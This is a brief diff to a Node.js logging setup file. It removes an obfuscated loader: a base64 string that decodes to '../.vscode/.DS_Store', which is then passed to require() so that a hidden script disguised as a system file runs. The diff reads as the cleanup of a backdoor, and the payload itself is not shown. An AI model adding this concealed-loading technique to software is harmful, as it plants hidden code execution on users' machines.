@@ -1,9 +1,7 @@
 const log4js = require("log4js")
-const base = st => Buffer.from(st, 'base64').toString('utf8')
-const denv = base('Li4vLnZzY29kZS8uRFNfU3RvcmU')
+
 // Import global variables
 const { LOG_LEVELS, RESPONSE_CODES } = require("./constants")
-require(denv)
 
 log4js.configure({
   appenders: {
